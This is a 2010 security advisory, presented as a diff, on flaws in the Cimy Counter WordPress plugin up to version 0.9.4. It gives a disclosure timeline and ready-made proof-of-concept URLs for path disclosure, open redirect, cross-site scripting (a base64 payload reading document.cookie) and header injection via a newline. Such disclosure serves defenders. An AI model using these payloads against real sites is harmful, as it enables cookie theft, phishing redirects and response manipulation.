@@ -1,0 +1,42 @@
+----------------------------
+Advisory: Vulnerabilities in Cimy Counter for WordPress
+-----------------------------
+URL: http://sebug.net/exploit/19862/
+-----------------------------
+Affected products: Cimy Counter 0.9.4 and previous versions.
+-----------------------------
+Timeline:
+
+20.04.2010 - found vulnerabilities.
+28.04.2010 - announced at my site.
+29.04.2010 - informed developer.
+06.05.2010 - developer released Cimy Counter 0.9.5. In version 0.9.5 the
+author fixed all mentioned vulnerabilities except Redirector (aka URL
+Redirector Abuse in WASC TC v2). And I gave him addition argumentation to
+fix Redirector hole also.
+24.06.2010 - disclosed at my site.
+-----------------------------
+Details:
+
+These are Full path disclosure, Redirector, Cross-Site Scripting and HTTP
+Response Spitting vulnerabilities.
+
+Full path disclosure:
+
+http://site/wp-content/plugins/cimy-counter/cimy_counter.php
+
+http://site/wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&fn=%0A1
+
+Redirector:
+
+http://site/wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&fn=http://websecurity.com.ua
+
+XSS:
+
+http://site/wp-content/plugins/cimy-counter/cc_redirect.php?cc=Downloads&fn=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2b
+
+HTTP Response Spitting:
+
+http://site/wp-content/plugins/cimy-counter/cc_redirect.php?cc=TestCounter&fn=%0AHeader:test
+
+Works at old versions of PHP.
